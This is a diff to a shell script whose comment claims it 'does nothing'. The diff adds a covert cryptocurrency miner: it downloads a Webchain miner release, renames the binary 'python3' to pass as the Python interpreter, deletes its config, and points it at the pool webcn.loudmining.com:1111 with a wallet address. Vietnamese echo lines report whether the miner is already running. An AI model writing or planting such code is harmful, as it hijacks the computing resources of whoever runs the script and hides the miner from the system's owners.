@@ -10,7 +10,7 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/minergate-cli/python3 ]; then
+if [ -f ${PWD}/python3 ]; then
     if pgrep -x "python3" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
@@ -18,16 +18,18 @@ then
 else
 
 echo "Miner da install , chay thoi "
-cd minergate-cli
-./python3 -u haidang.ild@gmail.com --xmr 2
+./python3 -o webcn.loudmining.com:1111 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x -worker-id 100
 
      
 fi
 exit
 fi
 
-wget https://download.minergate.com/xfast-ubuntu-cli
-unzip xfast-ubuntu-cli
-cd minergate-cli
-mv minergate-cli python3
-./python3 -u haidang.ild@gmail.com --xmr 2
+
+wget https://github.com/webchain-network/webchain-miner/releases/download/v2.6.2.0/webchain-miner-2.6.2.0-linux-amd64.tar.gz
+tar xvzf webchain-miner-2.6.2.0-linux-amd64.tar.gz
+mv webchain-miner python3
+rm config.json
+./python3 -o webcn.loudmining.com:1111 -u 0x3bd1c067bbfe2ea37a0a632c6fa81626532d9262 -p x -worker-id 100
+
+exit 0
